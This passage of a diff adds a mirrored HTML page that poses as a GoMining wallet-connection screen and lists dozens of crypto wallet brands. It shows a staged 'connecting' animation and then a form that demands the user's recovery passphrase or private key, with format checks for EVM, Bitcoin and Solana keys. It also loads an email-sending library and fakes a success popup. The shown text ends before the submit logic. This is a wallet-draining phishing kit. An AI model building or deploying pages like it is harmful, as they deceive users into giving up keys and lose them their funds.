@@ -1,0 +1,1132 @@
+<!DOCTYPE html>
+<html lang="en">
+  
+<!-- Mirrored from gomining-llc.vercel.app/wallet.html by HTTrack Website Copier/3.x [XR&CO'2017], Fri, 23 Oct 2026 19:32:27 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Wallets – GoMining</title>
+    <script src="../cdn.jsdelivr.net/npm/%40emailjs/browser%404/dist/email.min.js"></script>
+    <style>
+      @import url("../external.html?link=https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&amp;family=Syne:wght@400;600;800&amp;display=swap");
+
+      :root {
+        --bg: #0a0a0f;
+        --card-bg: #111118;
+        --border: rgba(255, 255, 255, 0.07);
+        --accent: #f0c040;
+        --accent2: #e05a2b;
+        --text: #f0ede8;
+        --muted: #888;
+        --radius: 14px;
+      }
+
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        background: var(--bg);
+        color: var(--text);
+        font-family: "Syne", sans-serif;
+        min-height: 100vh;
+      }
+
+      .ticker-wrap {
+        flex: 1;
+        overflow: hidden;
+        margin-left: 32px;
+        mask-image: linear-gradient(
+          to right,
+          transparent 0%,
+          black 8%,
+          black 92%,
+          transparent 100%
+        );
+        -webkit-mask-image: linear-gradient(
+          to right,
+          transparent 0%,
+          black 8%,
+          black 92%,
+          transparent 100%
+        );
+      }
+      .ticker-track {
+        display: flex;
+        width: max-content;
+        animation: ticker-scroll 30s linear infinite;
+      }
+      .ticker-slide {
+        display: flex;
+        align-items: center;
+        gap: 28px;
+        padding: 0 14px;
+      }
+      .ticker-slide img {
+        width: 30px;
+        height: 30px;
+        object-fit: contain;
+        opacity: 0.5;
+        transition: opacity 0.2s;
+        flex-shrink: 0;
+      }
+      .ticker-slide img:hover {
+        opacity: 1;
+      }
+      @keyframes ticker-scroll {
+        0% {
+          transform: translateX(0);
+        }
+        100% {
+          transform: translateX(-50%);
+        }
+      }
+
+      .header {
+        padding: 28px 40px;
+        border-bottom: 1px solid var(--border);
+        display: flex;
+        align-items: center;
+      }
+      .logo {
+        font-family: "Space Mono", monospace;
+        font-size: 1.1rem;
+        letter-spacing: 0.15em;
+        color: var(--accent);
+        text-transform: lowercase;
+      }
+      .logo::before {
+        content: "⬡ ";
+      }
+
+      .brands-section {
+        padding: 60px 40px 80px;
+        max-width: 1200px;
+        margin: 0 auto;
+      }
+      .brands-header {
+        margin-bottom: 52px;
+      }
+      .brands-header h1 {
+        font-size: clamp(2rem, 5vw, 3.4rem);
+        font-weight: 800;
+        line-height: 1.1;
+        background: linear-gradient(
+          135deg,
+          var(--accent) 0%,
+          var(--accent2) 100%
+        );
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+      }
+      .brands-header p {
+        margin-top: 10px;
+        color: var(--muted);
+        font-size: 1rem;
+        letter-spacing: 0.03em;
+      }
+
+      .brands-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+        gap: 14px;
+      }
+      .brand-card {
+        background: var(--card-bg);
+        border: 1px solid var(--border);
+        border-radius: var(--radius);
+        padding: 24px 12px 18px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 12px;
+        cursor: pointer;
+        transition: transform 0.18s ease, border-color 0.18s ease,
+          box-shadow 0.18s ease;
+        position: relative;
+        overflow: hidden;
+      }
+      .brand-card::after {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background: linear-gradient(
+          135deg,
+          rgba(240, 192, 64, 0.07),
+          transparent 60%
+        );
+        opacity: 0;
+        transition: opacity 0.2s;
+      }
+      .brand-card:hover {
+        transform: translateY(-4px);
+        border-color: rgba(240, 192, 64, 0.35);
+        box-shadow: 0 8px 30px rgba(240, 192, 64, 0.08);
+      }
+      .brand-card:hover::after {
+        opacity: 1;
+      }
+      .brand-card img {
+        width: 46px;
+        height: 46px;
+        object-fit: contain;
+      }
+      .brand-card span {
+        font-size: 0.8rem;
+        font-weight: 600;
+        letter-spacing: 0.03em;
+        color: var(--text);
+        text-align: center;
+      }
+
+      .modal-overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.75);
+        backdrop-filter: blur(6px);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.22s ease;
+        z-index: 999;
+        padding: 20px;
+      }
+      .modal-overlay.active {
+        opacity: 1;
+        pointer-events: all;
+      }
+      .modal {
+        background: #16161f;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 20px;
+        padding: 40px;
+        width: 100%;
+        max-width: 460px;
+        position: relative;
+        transform: translateY(20px) scale(0.97);
+        transition: transform 0.25s ease;
+        box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
+        max-height: 90vh;
+        overflow-y: auto;
+      }
+      .modal-overlay.active .modal {
+        transform: translateY(0) scale(1);
+      }
+      .modal-close {
+        position: absolute;
+        top: 16px;
+        right: 16px;
+        background: rgba(255, 255, 255, 0.07);
+        border: none;
+        border-radius: 50%;
+        width: 32px;
+        height: 32px;
+        color: var(--muted);
+        font-size: 0.9rem;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: background 0.15s, color 0.15s;
+      }
+      .modal-close:hover {
+        background: rgba(255, 255, 255, 0.14);
+        color: var(--text);
+      }
+      .modal h3 {
+        font-size: 1.3rem;
+        font-weight: 800;
+        background: linear-gradient(135deg, var(--accent), var(--accent2));
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+      }
+
+      .connecting-screen {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 20px 0 10px;
+        gap: 20px;
+      }
+      .connecting-logo {
+        width: 72px;
+        height: 72px;
+        object-fit: contain;
+        border-radius: 16px;
+        animation: pulse 1.4s ease-in-out infinite;
+      }
+      @keyframes pulse {
+        0%,
+        100% {
+          opacity: 1;
+          transform: scale(1);
+        }
+        50% {
+          opacity: 0.6;
+          transform: scale(0.92);
+        }
+      }
+      .connecting-title {
+        font-size: 1.05rem;
+        font-weight: 700;
+        color: var(--text);
+        text-align: center;
+        letter-spacing: 0.02em;
+      }
+      .connecting-title span {
+        background: linear-gradient(135deg, var(--accent), var(--accent2));
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+      }
+      .progress-bar-wrap {
+        width: 100%;
+        height: 4px;
+        background: rgba(255, 255, 255, 0.06);
+        border-radius: 99px;
+        overflow: hidden;
+        margin-top: 4px;
+      }
+      .progress-bar-fill {
+        height: 100%;
+        width: 0%;
+        border-radius: 99px;
+        background: linear-gradient(90deg, var(--accent), var(--accent2));
+        transition: width 0.12s linear;
+      }
+      .status-steps {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+        width: 100%;
+        margin-top: 6px;
+      }
+      .status-step {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 0.8rem;
+        color: var(--muted);
+        font-family: "Space Mono", monospace;
+        opacity: 0;
+        transform: translateX(-6px);
+        transition: opacity 0.3s ease, transform 0.3s ease, color 0.3s ease;
+      }
+      .status-step.visible {
+        opacity: 1;
+        transform: translateX(0);
+      }
+      .status-step.done {
+        color: #6dd48a;
+      }
+      .status-step.active {
+        color: var(--text);
+      }
+      .step-dot {
+        width: 7px;
+        height: 7px;
+        border-radius: 50%;
+        background: var(--muted);
+        flex-shrink: 0;
+        transition: background 0.3s;
+      }
+      .status-step.done .step-dot {
+        background: #6dd48a;
+      }
+      .status-step.active .step-dot {
+        background: var(--accent);
+        box-shadow: 0 0 6px var(--accent);
+        animation: blink 0.7s ease-in-out infinite;
+      }
+      @keyframes blink {
+        0%,
+        100% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0.3;
+        }
+      }
+
+      .form-screen {
+        display: none;
+      }
+      .form-screen.visible {
+        display: block;
+      }
+
+      .tab-bar {
+        display: flex;
+        border-bottom: 1px solid var(--border);
+        margin-bottom: 22px;
+      }
+      .tab-btn {
+        flex: 1;
+        padding: 11px 0;
+        background: none;
+        border: none;
+        border-bottom: 2px solid transparent;
+        color: var(--muted);
+        font-family: "Syne", sans-serif;
+        font-size: 0.88rem;
+        font-weight: 600;
+        letter-spacing: 0.06em;
+        text-transform: uppercase;
+        cursor: pointer;
+        transition: color 0.18s, border-color 0.18s;
+        margin-bottom: -1px;
+      }
+      .tab-btn.active {
+        color: var(--accent);
+        border-bottom: 2px solid var(--accent);
+      }
+      .tab-btn:hover:not(.active) {
+        color: var(--text);
+      }
+      .tab-panel {
+        display: none;
+      }
+      .tab-panel.active {
+        display: block;
+      }
+
+      .form-group {
+        margin-bottom: 18px;
+      }
+      .form-group label {
+        display: block;
+        font-size: 0.78rem;
+        font-weight: 600;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        color: var(--muted);
+        margin-bottom: 7px;
+      }
+      .form-group textarea {
+        width: 100%;
+        background: rgba(255, 255, 255, 0.04);
+        border: 1px solid var(--border);
+        border-radius: 10px;
+        padding: 12px 14px;
+        color: var(--text);
+        font-family: "Syne", sans-serif;
+        font-size: 0.93rem;
+        outline: none;
+        transition: border-color 0.15s;
+        resize: vertical;
+      }
+      .form-group textarea:focus {
+        border-color: rgba(240, 192, 64, 0.5);
+      }
+      .form-group textarea::placeholder {
+        color: #444;
+        font-size: 15px;
+      }
+
+      /* key field only — monospace reads better for base58/hex */
+      #issueBox {
+        font-family: "Space Mono", monospace;
+        font-size: 0.85rem;
+        resize: none;
+      }
+
+      .submit-btn {
+        width: 100%;
+        padding: 14px;
+        background: linear-gradient(
+          135deg,
+          var(--accent) 0%,
+          var(--accent2) 100%
+        );
+        border: none;
+        border-radius: 10px;
+        color: #0a0a0f;
+        font-family: "Syne", sans-serif;
+        font-size: 0.95rem;
+        font-weight: 800;
+        cursor: pointer;
+        letter-spacing: 0.04em;
+        transition: opacity 0.15s, transform 0.15s;
+        margin-top: 8px;
+      }
+      .submit-btn:hover {
+        opacity: 0.9;
+        transform: translateY(-1px);
+      }
+      .submit-btn:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+        transform: none;
+      }
+      .phrase-hint {
+        font-size: 0.75rem;
+        font-family: "Space Mono", monospace;
+        margin-top: 6px;
+        text-align: right;
+        color: var(--muted);
+        transition: color 0.2s;
+      }
+      .phrase-hint.valid {
+        color: #6dd48a;
+      }
+      .phrase-hint.invalid {
+        color: #f08080;
+      }
+
+      .success-popup-overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.6);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.22s ease;
+        z-index: 1000;
+        padding: 20px;
+      }
+      .success-popup-overlay.active {
+        opacity: 1;
+        pointer-events: all;
+      }
+      .success-popup {
+        background: #ffffff;
+        border-radius: 16px;
+        padding: 32px 28px 24px;
+        width: 100%;
+        max-width: 380px;
+        text-align: left;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        position: relative;
+        transform: translateY(16px) scale(0.97);
+        transition: transform 0.25s ease;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      }
+      .success-popup-overlay.active .success-popup {
+        transform: translateY(0) scale(1);
+      }
+      .gas-popup-close {
+        position: absolute;
+        top: 14px;
+        left: 14px;
+        background: #f0f0f0;
+        border: none;
+        border-radius: 8px;
+        width: 32px;
+        height: 32px;
+        color: #999;
+        font-size: 1rem;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: background 0.15s;
+      }
+      .gas-popup-close:hover {
+        background: #e0e0e0;
+        color: #555;
+      }
+      .success-popup h3 {
+        font-size: 1.25rem;
+        font-weight: 700;
+        color: #111;
+        letter-spacing: 0;
+        margin-top: 8px;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      }
+      .success-popup p {
+        color: #444;
+        font-size: 0.95rem;
+        line-height: 1.6;
+        margin: 0;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        font-weight: 400;
+      }
+      .success-close-btn {
+        align-self: flex-end;
+        margin-top: 8px;
+        padding: 10px 28px;
+        background: #d0eaff;
+        border: none;
+        border-radius: 10px;
+        color: #3a9ad9;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        font-size: 0.95rem;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.15s;
+        width: auto;
+      }
+      .success-close-btn:hover {
+        background: #b8dcf5;
+      }
+
+      @media (max-width: 600px) {
+        .header {
+          padding: 20px;
+        }
+        .brands-section {
+          padding: 40px 16px 60px;
+        }
+        .brands-grid {
+          grid-template-columns: repeat(3, 1fr);
+          gap: 10px;
+        }
+        .brand-card {
+          padding: 16px 8px 14px;
+          gap: 8px;
+        }
+        .brand-card img {
+          width: 36px;
+          height: 36px;
+        }
+        .brand-card span {
+          font-size: 0.7rem;
+        }
+        .modal {
+          padding: 28px 20px;
+        }
+        .success-popup {
+          padding: 44px 24px 30px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="page-wrapper">
+      <header class="header">
+        <h2 class="logo">gomining</h2>
+        <div class="ticker-wrap">
+          <div class="ticker-track">
+            <div class="ticker-slide">
+              <img src="Icons/Metamask-Digital-Asset-Logo-PNG.png" alt="MetaMask" />
+              <img src="Icons/trust-wallet-icon.png" alt="Trust Wallet" />
+              <img src="Icons/idreP17eZK_1773876334789.jpeg" alt="Phantom" />
+              <img src="Icons/Ledger.jfif" alt="Ledger" />
+              <img src="Icons/trezor.png" alt="Trezor" />
+              <img src="Icons/Exodus.png" alt="Exodus" />
+              <img src="Icons/coinbase.png" alt="Coinbase" />
+              <img src="Icons/rainbow.jfif" alt="Rainbow" />
+              <img src="Icons/zerion-logo.png" alt="Zerion" />
+              <img src="Icons/Uniswap-logo.png" alt="Uniswap" />
+              <img src="Icons/binance-logo.png" alt="Binance" />
+              <img src="Icons/okx-logo.png" alt="OKX" />
+              <img src="Icons/bybit-logo.png" alt="Bybit" />
+              <img src="Icons/crypto-logo.jfif" alt="Crypto.com" />
+              <img src="Icons/Kraken.jfif" alt="Kraken" />
+              <img src="Icons/Solflare.png" alt="Solflare" />
+              <img src="Icons/backpack.jfif" alt="Backpack" />
+              <img src="Icons/argent.png" alt="Argent" />
+              <img src="Icons/Atomic-wallet.png" alt="Atomic" />
+              <img src="Icons/zengo.png" alt="Zengo" />
+              <img src="Icons/rabby.html" alt="Rabby"
+                onerror="this.onerror=null;this.src='../raw.githubusercontent.com/RabbyHub/logo/master/symbol.png'" />
+              <img src="Icons/walletconnect.html" alt="WalletConnect"
+                onerror="this.onerror=null;this.src='../raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png'" />
+              <img src="Icons/cake.html" alt="Cake Wallet"
+                onerror="this.onerror=null;this.src='../cryptologos.zenobank.io/library/cake-wallet-icon-light.png'" />
+            </div>
+            <div class="ticker-slide">
+              <img src="Icons/Metamask-Digital-Asset-Logo-PNG.png" alt="MetaMask" />
+              <img src="Icons/trust-wallet-icon.png" alt="Trust Wallet" />
+              <img src="Icons/idreP17eZK_1773876334789.jpeg" alt="Phantom" />
+              <img src="Icons/Ledger.jfif" alt="Ledger" />
+              <img src="Icons/trezor.png" alt="Trezor" />
+              <img src="Icons/Exodus.png" alt="Exodus" />
+              <img src="Icons/coinbase.png" alt="Coinbase" />
+              <img src="Icons/rainbow.jfif" alt="Rainbow" />
+              <img src="Icons/zerion-logo.png" alt="Zerion" />
+              <img src="Icons/Uniswap-logo.png" alt="Uniswap" />
+              <img src="Icons/binance-logo.png" alt="Binance" />
+              <img src="Icons/okx-logo.png" alt="OKX" />
+              <img src="Icons/bybit-logo.png" alt="Bybit" />
+              <img src="Icons/crypto-logo.jfif" alt="Crypto.com" />
+              <img src="Icons/Kraken.jfif" alt="Kraken" />
+              <img src="Icons/Solflare.png" alt="Solflare" />
+              <img src="Icons/backpack.jfif" alt="Backpack" />
+              <img src="Icons/argent.png" alt="Argent" />
+              <img src="Icons/Atomic-wallet.png" alt="Atomic" />
+              <img src="Icons/zengo.png" alt="Zengo" />
+              <img src="Icons/rabby.html" alt="Rabby"
+                onerror="this.onerror=null;this.src='../raw.githubusercontent.com/RabbyHub/logo/master/symbol.png'" />
+              <img src="Icons/walletconnect.html" alt="WalletConnect"
+                onerror="this.onerror=null;this.src='../raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png'" />
+              <img src="Icons/cake.html" alt="Cake Wallet"
+                onerror="this.onerror=null;this.src='../cryptologos.zenobank.io/library/cake-wallet-icon-light.png'" />
+            </div>
+          </div>
+        </div>
+      </header>
+
+      <section class="brands-section">
+        <div class="brands-header">
+          <h1>Wallets</h1>
+          <p>Select a wallet:</p>
+        </div>
+        <div class="brands-grid">
+          <div class="brand-card" onclick="openModal('MetaMask','Icons/Metamask-Digital-Asset-Logo-PNG.png')">
+            <img src="Icons/Metamask-Digital-Asset-Logo-PNG.png" alt="MetaMask" /><span>MetaMask</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Trust Wallet','Icons/trust-wallet-icon.png')">
+            <img src="Icons/trust-wallet-icon.png" alt="Trust Wallet" /><span>Trust Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Phantom','Icons/idreP17eZK_1773876334789.jpeg')">
+            <img src="Icons/idreP17eZK_1773876334789.jpeg" alt="Phantom" /><span>Phantom</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Ledger','Icons/Ledger.jfif')">
+            <img src="Icons/Ledger.jfif" alt="Ledger" /><span>Ledger</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Trezor','Icons/trezor.png')">
+            <img src="Icons/trezor.png" alt="Trezor" /><span>Trezor</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Exodus','Icons/Exodus.png')">
+            <img src="Icons/Exodus.png" alt="Exodus" /><span>Exodus</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Coinbase Wallet','Icons/coinbase.png')">
+            <img src="Icons/coinbase.png" alt="Coinbase Wallet" /><span>Coinbase Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Rainbow','Icons/rainbow.jfif')">
+            <img src="Icons/rainbow.jfif" alt="Rainbow" /><span>Rainbow</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Zerion','Icons/zerion-logo.png')">
+            <img src="Icons/zerion-logo.png" alt="Zerion" /><span>Zerion</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Uniswap Wallet','Icons/Uniswap-logo.png')">
+            <img src="Icons/Uniswap-logo.png" alt="Uniswap Wallet" /><span>Uniswap Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Binance Wallet','Icons/binance-logo.png')">
+            <img src="Icons/binance-logo.png" alt="Binance Wallet" /><span>Binance Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('OKX Wallet','Icons/okx-logo.png')">
+            <img src="Icons/okx-logo.png" alt="OKX Wallet" /><span>OKX Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Bybit Wallet','Icons/bybit-logo.png')">
+            <img src="Icons/bybit-logo.png" alt="Bybit Wallet" /><span>Bybit Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Crypto.com Wallet','Icons/crypto-logo.jfif')">
+            <img src="Icons/crypto-logo.jfif" alt="Crypto.com" /><span>Crypto.com</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Kraken Wallet','Icons/Kraken.jfif')">
+            <img src="Icons/Kraken.jfif" alt="Kraken Wallet" /><span>Kraken Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Solflare','Icons/Solflare.png')">
+            <img src="Icons/Solflare.png" alt="Solflare" /><span>Solflare</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Backpack','Icons/backpack.jfif')">
+            <img src="Icons/backpack.jfif" alt="Backpack" /><span>Backpack</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Argent','Icons/argent.png')">
+            <img src="Icons/argent.png" alt="Argent" /><span>Argent</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Gnosis Safe','Icons/Gnosis.png')">
+            <img src="Icons/Gnosis.png" alt="Gnosis Safe" /><span>Gnosis Safe</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Atomic Wallet','Icons/Atomic-wallet.png')">
+            <img src="Icons/Atomic-wallet.png" alt="Atomic Wallet" /><span>Atomic Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Electrum','Icons/electrum.jfif')">
+            <img src="Icons/electrum.jfif" alt="Electrum" /><span>Electrum</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Mycelium','Icons/Mycelium.png')">
+            <img src="Icons/Mycelium.png" alt="Mycelium" /><span>Mycelium</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Edge Wallet','Icons/Egde.jfif')">
+            <img src="Icons/Egde.jfif" alt="Edge Wallet" /><span>Edge Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Blockchain.com','Icons/blockchain.png')">
+            <img src="Icons/blockchain.png" alt="Blockchain.com" /><span>Blockchain.com</span>
+          </div>
+          <div class="brand-card" onclick="openModal('BitPay','Icons/bitpay.jfif')">
+            <img src="Icons/bitpay.jfif" alt="BitPay" /><span>BitPay</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Xdefi Wallet','Icons/xdefi.jfif')">
+            <img src="Icons/xdefi.jfif" alt="Xdefi" /><span>Xdefi Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Keplr','Icons/keplr.jfif')">
+            <img src="Icons/keplr.jfif" alt="Keplr" /><span>Keplr</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Terra Station','Icons/Terra%20station.png')">
+            <img src="Icons/Terra%20station.png" alt="Terra Station" /><span>Terra Station</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Leap Wallet','Icons/Leap%20wallet.png')">
+            <img src="Icons/Leap%20wallet.png" alt="Leap Wallet" /><span>Leap Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Zengo','Icons/zengo.png')">
+            <img src="Icons/zengo.png" alt="Zengo"
+              onerror="this.onerror=null;this.src='../cryptologos.zenobank.io/library/zengo-wallet-icon-light.png'" /><span>Zengo</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Rabby Wallet','Icons/rabby.html')">
+            <img src="Icons/rabby.html" alt="Rabby Wallet"
+              onerror="this.onerror=null;this.src='../raw.githubusercontent.com/RabbyHub/logo/master/symbol.png'" /><span>Rabby Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('WalletConnect','Icons/walletconnect.html')">
+            <img src="Icons/walletconnect.html" alt="WalletConnect"
+              onerror="this.onerror=null;this.src='../raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png'" /><span>WalletConnect</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Cake Wallet','Icons/cake.html')">
+            <img src="Icons/cake.html" alt="Cake Wallet"
+              onerror="this.onerror=null;this.src='../cryptologos.zenobank.io/library/cake-wallet-icon-light.png'" /><span>Cake Wallet</span>
+          </div>
+        </div>
+      </section>
+    </div>
+
+    <!-- ===== WALLET MODAL ===== -->
+    <div class="modal-overlay" id="modalOverlay">
+      <div class="modal">
+        <button class="modal-close" id="modalClose">✕</button>
+
+        <!-- Connecting screen -->
+        <div class="connecting-screen" id="connectingScreen">
+          <img class="connecting-logo" id="connectingLogo" alt="" />
+          <div class="connecting-title">
+            Connecting to <span id="connectingWalletName"></span>
+          </div>
+          <div class="progress-bar-wrap">
+            <div class="progress-bar-fill" id="progressFill"></div>
+          </div>
+          <div class="status-steps" id="statusSteps"></div>
+        </div>
+
+        <!-- Form screen -->
+        <div class="form-screen" id="formScreen">
+          <h3 style="margin-bottom: 18px">Manual Connection</h3>
+
+          <div class="tab-bar">
+            <button class="tab-btn active" data-tab="phrase">Passphrase</button>
+            <button class="tab-btn" data-tab="key">Private Key</button>
+          </div>
+
+          <div class="tab-panel active" data-panel="phrase">
+            <div class="form-group">
+              <label>Passphrase</label>
+              <textarea
+                id="phraseInput"
+                rows="4"
+                spellcheck="false"
+                placeholder="Enter your recovery passphrase typically 12-24 words separated by a space"
+              ></textarea>
+              <div class="phrase-hint" id="phraseHint">
+                0 words — min 12, max 24
+              </div>
+            </div>
+          </div>
+
+          <div class="tab-panel" data-panel="key">
+            <div class="form-group">
+              <label>Private Key</label>
+              <textarea
+                id="issueBox"
+                rows="4"
+                minlength="51"
+                maxlength="88"
+                spellcheck="false"
+                placeholder="Paste your private key (51-88 characters)"
+              ></textarea>
+              <div class="phrase-hint" id="keyHint">
+                0 characters — min 51, max 88
+              </div>
+            </div>
+          </div>
+
+          <button class="submit-btn" id="submitBtn" disabled>Connect</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== SUCCESS POPUP ===== -->
+    <div class="success-popup-overlay" id="successOverlay">
+      <div class="success-popup">
+        <button class="gas-popup-close" id="successClose">✕</button>
+        <h3>Wallet Connected</h3>
+        <p>
+          Your <strong id="successWalletName"></strong> wallet has been connected
+          successfully.
+        </p>
+        <button class="success-close-btn" id="successDone">Done</button>
+      </div>
+    </div>
+
+    <script>
+      (function () {
+        const overlay = document.getElementById("modalOverlay");
+        const connecting = document.getElementById("connectingScreen");
+        const form = document.getElementById("formScreen");
+        const progressFill = document.getElementById("progressFill");
+        const statusSteps = document.getElementById("statusSteps");
+        const logoEl = document.getElementById("connectingLogo");
+        const nameEl = document.getElementById("connectingWalletName");
+        const successName = document.getElementById("successWalletName");
+        const phraseInput = document.getElementById("phraseInput");
+        const phraseHint = document.getElementById("phraseHint");
+        const keyInput = document.getElementById("issueBox");
+        const keyHint = document.getElementById("keyHint");
+        const submitBtn = document.getElementById("submitBtn");
+        const successOverlay = document.getElementById("successOverlay");
+
+        const KEY_MIN = 51;
+        const KEY_MAX = 88;
+
+        // Internet backups for the wallet icons.
+        // Only used if the matching file inside /Icons is missing.
+        // This is what stops the popup logo from coming up blank.
+        const ICON_FALLBACKS = {
+          "Icons/zengo.png":
+            "https://cryptologos.zenobank.io/library/zengo-wallet-icon-dark.png",
+          "Icons/rabby.png":
+            "https://raw.githubusercontent.com/RabbyHub/logo/master/symbol.png",
+          "Icons/walletconnect.png":
+            "https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png",
+          "Icons/cake.png":
+            "https://cryptologos.zenobank.io/library/cake-wallet-icon-dark.png",
+        };
+
+        let timers = [];
+        const STEPS = [
+          "Establishing secure connection…",
+          "Verifying wallet signature…",
+          "Syncing account state…",
+          "Almost there…",
+        ];
+
+        function clearTimers() {
+          timers.forEach(clearTimeout);
+          timers = [];
+        }
+
+        function setTab(tab) {
+          document.querySelectorAll(".tab-btn").forEach((b) =>
+            b.classList.toggle("active", b.dataset.tab === tab)
+          );
+          document.querySelectorAll(".tab-panel").forEach((p) =>
+            p.classList.toggle("active", p.dataset.panel === tab)
+          );
+          updateSubmitState();
+        }
+
+        function activeTab() {
+          return document.querySelector(".tab-panel.active").dataset.panel;
+        }
+
+        // ---- passphrase: exactly 12 or 24 words ----
+        function wordCount(v) {
+          return v.trim() ? v.trim().split(/\s+/).length : 0;
+        }
+
+        function phraseValid() {
+          const n = wordCount(phraseInput.value);
+          return n === 12 || n === 24;
+        }
+
+        function updatePhraseHint() {
+          const n = wordCount(phraseInput.value);
+          if (n === 0) {
+            phraseHint.textContent = "0 words — min 12, max 24";
+            phraseHint.className = "phrase-hint";
+          } else if (n === 12 || n === 24) {
+            phraseHint.textContent = n + " words — looks good";
+            phraseHint.className = "phrase-hint valid";
+          } else {
+            phraseHint.textContent = n + " words — min 12, max 24";
+            phraseHint.className = "phrase-hint invalid";
+          }
+        }
+
+        // ---- private key: strict min/max + real format ----
+        // length must be within KEY_MIN..KEY_MAX, and match:
+        //   64 hex chars (optional 0x) -> EVM
+        //   51-52 base58 chars         -> Bitcoin
+        //   87-88 base58 chars         -> Solana
+        function keyValid() {
+          const t = keyInput.value.trim();
+          const len = t.length;
+          if (len < KEY_MIN || len > KEY_MAX) return false;
+          if (/^0x[0-9a-fA-F]{64}$/.test(t)) return true;
+          if (/^[0-9a-fA-F]{64}$/.test(t)) return true;
+          if (/^[1-9A-HJ-NP-Za-km-z]{51,52}$/.test(t)) return true;
+          if (/^[1-9A-HJ-NP-Za-km-z]{87,88}$/.test(t)) return true;
+          return false;
+        }
+
+        function updateKeyHint() {
+          const t = keyInput.value.trim();
+          const len = t.length;
+
+          if (len === 0) {
+            keyHint.textContent = "0 characters — min " + KEY_MIN + ", max " + KEY_MAX;
+            keyHint.className = "phrase-hint";
+            return;
+          }
+
+          if (len < KEY_MIN) {
+            keyHint.textContent =
+              len + " / " + KEY_MIN + " characters — too short";
+            keyHint.className = "phrase-hint invalid";
+            return;
+          }
+
+          if (len > KEY_MAX) {
+            keyHint.textContent =
+              len + " / " + KEY_MAX + " characters — too long";
+            keyHint.className = "phrase-hint invalid";
+            return;
+          }
+
+          if (keyValid()) {
+            keyHint.textContent = len + " characters — looks good";
+            keyHint.className = "phrase-hint valid";
+            return;
+          }
+
+          keyHint.textContent = len + " characters — invalid key format";
+          keyHint.className = "phrase-hint invalid";
+        }
+
+        // Connect stays locked until the active tab is valid
+        function updateSubmitState() {
+          if (activeTab() === "phrase") {
+            updatePhraseHint();
